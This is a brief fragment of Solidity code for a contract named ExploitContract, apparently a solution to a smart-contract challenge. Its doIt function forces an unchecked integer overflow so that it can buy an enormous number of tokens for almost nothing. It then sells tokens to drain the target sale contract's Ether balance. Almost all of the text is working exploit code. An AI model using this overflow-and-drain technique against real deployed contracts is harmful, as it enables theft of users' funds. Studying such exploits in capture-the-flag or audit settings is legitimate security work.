...
contract ExploitContract {
    ...
    function doIt() external payable {
        unchecked {
            uint256 count = type(uint256).max / PRICE_PER_TOKEN + 1;
            uint256 value = count * PRICE_PER_TOKEN;
            require(msg.value >= value);
            tokenSale.buy{value: value}(count);
        }

        uint256 count = address(tokenSale).balance / PRICE_PER_TOKEN;
        tokenSale.sell(count);
